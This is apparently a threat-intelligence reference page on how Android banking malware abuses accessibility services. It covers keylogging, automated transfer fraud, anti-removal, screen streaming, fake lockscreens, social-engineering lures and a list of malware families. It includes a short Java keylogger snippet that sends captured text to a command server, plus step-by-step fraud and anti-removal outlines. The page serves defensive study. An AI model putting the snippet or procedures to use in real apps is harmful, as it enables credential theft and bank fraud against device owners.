# Accessibility Abuse

Using Android's accessibility framework to control the device programmatically. An accessibility service can read any screen, click any button, type into any field, and perform any gesture. This gives malware full device control without exploiting any vulnerability: the framework works exactly as designed, just not for its intended purpose.

See also: [`BIND_ACCESSIBILITY_SERVICE`](../permissions/special/bind-accessibility-service.md) for the permission details, [Notification Suppression](notification-suppression.md), [Anti-Analysis Techniques](anti-analysis-techniques.md#play-protect-suppression), [Camera & Mic Surveillance](camera-mic-surveillance.md)

??? abstract "MITRE ATT&CK"

    | ID | Technique | Tactic |
    |---|---|---|
    | [T1453](https://attack.mitre.org/techniques/T1453/) | Abuse Accessibility Features | Collection, Credential Access |
    | [T1516](https://attack.mitre.org/techniques/T1516/) | Input Injection | Defense Evasion, Impact |

??? warning "Requirements"

    | Requirement | Details |
    |-------------|---------|
    | Permission | `BIND_ACCESSIBILITY_SERVICE` (granted via Settings toggle) |
    | Social Engineering | Convince user to enable the service |

    No exploit needed. The hardest part is getting the user to the Settings toggle and convincing them to enable it. Malware typically uses fake overlay dialogs ("Enable this service to continue", "Battery optimization required", "Accessibility update needed").

## Attack Capabilities

### Keylogging

Accessibility services receive `TYPE_VIEW_TEXT_CHANGED` events containing the text entered in any field across any app.

??? example "Keylogging via Accessibility Events"

    ```java
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            String packageName = event.getPackageName().toString();
            sendToC2(packageName, text);
        }
    }
    ```

### Auto-Granting Permissions

The malware navigates the system UI to grant itself additional permissions:

1. Open Settings via intent
2. Traverse the view tree to find "Allow" or toggle buttons
3. Perform `ACTION_CLICK` on the target node
4. Repeat for each permission needed

This effectively escalates from one permission (accessibility) to all permissions.

### On-Device Fraud (ATS)

Automated Transfer System ([T1516](https://attack.mitre.org/techniques/T1516/)): the malware operates the real banking app to initiate transfers. MITRE ATT&CK has no standalone technique for ATS; it is a compound behavior combining T1453 (accessibility abuse) and T1516 (input injection). Steps:

1. Wait for user to log into banking app (or use stolen credentials via overlay)
2. Navigate to transfer screen using accessibility gestures
3. Fill in attacker-controlled recipient and amount
4. Confirm the transaction
5. Intercept OTP from notification and enter it

The user's device is locked or shows a fake "updating" screen during the process. The transaction happens through the legitimate banking app, making it harder for bank-side fraud detection to flag.

### Anti-Removal

The malware prevents its own uninstallation:

- Monitors for navigation to Settings > Apps > [malware]
- When detected, performs `GLOBAL_ACTION_HOME` or `GLOBAL_ACTION_BACK` to exit Settings
- Can also click "Cancel" on uninstall confirmation dialogs
- Some families lock the screen and display a persistent overlay

### Notification Interception

With `flagRetrieveInteractiveWindows`, the accessibility service can read notification content from any app, functioning as an alternative to `BIND_NOTIFICATION_LISTENER_SERVICE`.

### Screen Streaming / VNC

Some families ([Hook](../malware/families/hook.md), [Octo](../malware/families/octo.md)) use accessibility events to build a real-time representation of the screen and stream it to the attacker, creating a VNC-like remote access capability. See [Screen Capture](screen-capture.md) for the full breakdown of MediaProjection vs. accessibility-based approaches.

## Malware Families by Accessibility Capability

| Family | Keylog | ATS | Anti-Remove | Screen Stream | Auto-Grant |
|--------|--------|-----|-------------|---------------|------------|
| [Anatsa](../malware/families/anatsa.md) | Yes | Yes | Yes | No | Yes |
| [Cerberus](../malware/families/cerberus.md) | Yes | No | Yes | No | Yes |
| [Hook](../malware/families/hook.md) | Yes | Yes | Yes | Yes (VNC) | Yes |
| [Octo](../malware/families/octo.md) | Yes | Yes | Yes | Yes | Yes |
| [SharkBot](../malware/families/sharkbot.md) | No | Yes | Yes | No | Yes |
| [Xenomorph](../malware/families/xenomorph.md) | Yes | Yes | Yes | No | Yes |
| [Medusa](../malware/families/medusa.md) | Yes | No | Yes | Yes | Yes |
| [Hydra](../malware/families/hydra.md) | Yes | No | Yes | Yes | Yes |

### Encrypted Messaging Interception

A technique [introduced by Sturnus](../malware/families/sturnus.md) in 2025 that exploits a fundamental weakness in encrypted messaging apps: messages must be decrypted for display. The accessibility service reads message content after the messaging app has already decrypted it for the user's screen.

!!! info "End-to-end encryption provides no protection"

    This works against WhatsApp, Telegram, Signal, and any app that renders plaintext on the device UI. The malware monitors `TYPE_VIEW_TEXT_CHANGED` and `TYPE_WINDOW_CONTENT_CHANGED` events from target messaging packages, capturing message text, sender info, and timestamps. Interception occurs after decryption, at the presentation layer.

### Human Behavior Mimicry

[Herodotus](../malware/families/herodotus.md) introduced typing delays and natural gesture patterns during ATS operations to evade behavioral biometric systems that banks deploy to detect automated device interaction. Rather than filling form fields instantly (a signal that fraud detection systems flag), the malware types characters with randomized inter-keystroke timing and performs swipe gestures at human-plausible speeds.

### Custom Keyboard Keylogging

[BlankBot](../malware/families/blankbot.md) and [Frogblight](../malware/families/frogblight.md) implement a custom `InputMethodService` (IME) that replaces the device keyboard. Once the malware's keyboard is set as default, every keystroke across every app passes through it. Unlike standard accessibility keylogging which captures text change events after the fact, a custom keyboard intercepts each key press directly, capturing passwords, PINs, and messages including characters deleted before submission.

The malware uses accessibility to silently navigate to Settings > Language & Input and switch the default keyboard to its own IME without user awareness. On some Android versions, this can be done entirely through accessibility gestures.

### Fake Lockscreen PIN Capture

[TrickMo](../malware/families/trickmo.md) and [TsarBot](../malware/families/tsarbot.md) display a full-screen overlay that replicates the device's lockscreen. When the device "appears" to lock, the user enters their PIN or pattern into the malware's fake lockscreen rather than the real one. The captured PIN enables the attacker to unlock the device during remote access sessions. This is distinct from banking overlay phishing since it targets the device unlock credential rather than app-specific credentials.

### Contact List Injection

[Crocodilus](../malware/families/crocodilus.md) uses accessibility to add entries to the device's contact list, inserting attacker-controlled phone numbers labeled as "Bank Support" or similar. When the victim later needs to contact their bank, they find the injected contact and call the attacker directly. This extends the accessibility attack surface beyond the device into social engineering.

## Social Engineering to Enable

Common lures used to get users to the accessibility settings:

| Lure | Approach |
|------|----------|
| "Accessibility update required" | Fake system dialog |
| "Battery optimization" | Overlay directing user to enable service |
| "Security scan" | Fake antivirus requiring accessibility |
| "Enable to continue" | App refuses to function until enabled |
| "Google Chrome update" | Impersonates Chrome update process |

## Platform Lifecycle

| Android Version | API | Change | Offensive Impact |
|----------------|-----|--------|-----------------|
| 1.6 | 4 | Accessibility framework introduced | Basic screen reading only |
| 4.0 | 14 | `canRetrieveWindowContent` added | Full screen content extraction |
| 4.1 | 16 | `TYPE_WINDOW_STATE_CHANGED` events | Real-time foreground app detection for [overlay](overlay-attacks.md) triggering |
| 4.3 | 18 | `flagRetrieveInteractiveWindows` | Cross-window content access including notifications |
| 7.0 | 24 | [`dispatchGesture()`](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService#dispatchGesture(android.accessibilityservice.GestureDescription,%20android.accessibilityservice.AccessibilityService.GestureResultCallback,%20android.os.Handler)) API | Programmatic gestures enable [ATS](automated-transfer-systems.md) |
| 7.0 | 24 | `GLOBAL_ACTION_LOCK_SCREEN` | Lock device during fraud operations |
| 8.0 | 26 | Must declare handled event types in config XML | Malware declares all types |
| 11 | 30 | `isAccessibilityTool` metadata required for Play Store visibility | Only affects apps targeting API 30+; sideloaded malware unaffected |
| 12 | 31 | Password field text redaction in `AccessibilityNodeInfo` | Partial, depends on app implementation |
| 13 | 33 | [Restricted settings](https://developer.android.com/about/versions/13/behavior-changes-13#restricted_non_sdk) for sideloaded apps | Bypassed by [session-based installers](play-store-evasion.md) |
| 13 | 33 | Accessibility shortcut warning improved | Users still click through warnings |
| 14 | 34 | [`accessibilityDataSensitive`](https://developer.android.com/reference/android/view/View#setAccessibilityDataSensitive(int)) attribute | Apps can hide sensitive views from non-tool services; adoption is slow |
| 15 | 35 | Expanded restricted settings enforcement | Closes some session-installer loopholes |

!!! danger "Fundamental Limitation"

    There is no technical way to distinguish a malicious accessibility service from a legitimate one at install time. The capability is inherent to the API. API 24's `dispatchGesture()` was the inflection point: it turned accessibility from a passive observation tool into a full device automation framework that enables [automated on-device fraud](automated-transfer-systems.md).

## Families Using This Technique

| Family | Primary Accessibility Abuse |
|--------|-----------------------------|
| [Cerberus](../malware/families/cerberus.md) | Keylogging |
| [Anatsa](../malware/families/anatsa.md) | ATS |
| [Hook](../malware/families/hook.md) | Screen streaming |
| [Ermac](../malware/families/ermac.md) | Overlay trigger |
| [SharkBot](../malware/families/sharkbot.md) | ATS |
| [Gustuff](../malware/families/gustuff.md) | ATS |
| [Xenomorph](../malware/families/xenomorph.md) | ATS |
| [Octo](../malware/families/octo.md) | Screen streaming |
| [Hydra](../malware/families/hydra.md) | Overlay trigger |
| [Medusa](../malware/families/medusa.md) | Screen streaming |
| [Vultur](../malware/families/vultur.md) | Screen streaming |
| [GodFather](../malware/families/godfather.md) | Overlay trigger |
| [Chameleon](../malware/families/chameleon.md) | Permission escalation |
| [Copybara](../malware/families/copybara.md) | ATS |
| [FluBot](../malware/families/flubot.md) | Permission escalation |
| [MoqHao](../malware/families/moqhao.md) | Auto-execution, permission escalation |
| [Zanubis](../malware/families/zanubis.md) | ATS |
| [Mamont](../malware/families/mamont.md) | Permission escalation |
| [SoumniBot](../malware/families/soumnibot.md) | Data theft |
| [Crocodilus](../malware/families/crocodilus.md) | Full DTO, contact list injection |
| [Herodotus](../malware/families/herodotus.md) | ATS with human behavior mimicry |
| [Sturnus](../malware/families/sturnus.md) | Encrypted messaging interception |
| [RatOn](../malware/families/raton.md) | ATS + NFC relay |
| [Klopatra](../malware/families/klopatra.md) | ATS |
| [BingoMod](../malware/families/bingomod.md) | VNC-based DTO |
| [Brokewell](../malware/families/brokewell.md) | Screen streaming, ATS |
| [Albiriox](../malware/families/albiriox.md) | ATS |
| LeifAccess | [Fake Google Play review posting](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-leifaccess-a-is-the-silent-fake-reviewer-trojan/) |
| [NGate](../malware/families/ngate.md) | Permission escalation |
| [GoldPickaxe](../malware/families/goldpickaxe.md) | Facial biometric capture |
| [SpyNote](../malware/families/spynote.md) | Keylogging, anti-removal |
| [Antidot](../malware/families/antidot.md) | ATS, keylogging |
| [TrickMo](../malware/families/trickmo.md) | Keylogging, fake lockscreen PIN capture |
| [TsarBot](../malware/families/tsarbot.md) | ATS, fake lockscreen PIN capture |
| [BlankBot](../malware/families/blankbot.md) | Custom keyboard keylogging |
| [Frogblight](../malware/families/frogblight.md) | Custom keyboard keylogging |
| [ToxicPanda](../malware/families/toxicpanda.md) | ATS |
| [BTMOB RAT](../malware/families/btmob.md) | Credential harvesting, auto-grant |
| [Rafel RAT](../malware/families/rafelrat.md) | Anti-removal, notification siphoning |
| [Gigabud](../malware/families/gigabud.md) | Screen recording trigger, automated payments |
| [PJobRAT](../malware/families/pjobrat.md) | Data exfiltration |
| [DeVixor](../malware/families/devixor.md) | Remote access via accessibility |
| [FireScam](../malware/families/firescam.md) | Notification monitoring |
